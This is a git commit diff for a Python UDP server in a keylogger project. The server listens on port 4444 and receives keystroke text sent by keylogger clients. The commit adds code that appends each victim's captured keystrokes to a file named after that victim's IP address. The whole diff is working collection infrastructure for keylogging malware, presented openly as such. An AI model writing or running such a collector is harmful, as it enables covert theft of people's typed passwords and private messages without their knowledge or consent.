3418c739d4feee772cdec4226d4a6b88d9ce296e
Guy Krinsky <guykrinsky9@gmail.com>
2021-12-26 13:45:43 +0200

    update server to save the keyloggers.

--- keylogger/udp_server.py
+++ keylogger/udp_server.py
@@ -3,13 +3,27 @@ import socket
 # Listen to all of the cumper's network card.
 IP_ADDRESS = "0.0.0.0"
 PORT_NUMBER = 4444
+KEYLOGGER_DIRECTORY_PATH = ".\KEYLOGGERS"
+
+
+def address_to_file_name(address: str) -> str:
+    return KEYLOGGER_DIRECTORY_PATH + '\\' + address.replace('.', '_')
+
+
+def add_text_to_file(text: str, address: str):
+    file_name = address_to_file_name(address)
+    with open(file_name, "a") as file:
+        file.write(text)
 
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
+        print("server is up")
         server_socket.bind((IP_ADDRESS, PORT_NUMBER))
         while True:
             data, client_address = server_socket.recvfrom(1024)
-            print(f"message is {data.decode()} from {client_address}")
+            text = data.decode()
+            print(f"message is {text} from {client_address}")
+            add_text_to_file(text, client_address[0])
 
 
 if __name__ == "__main__":
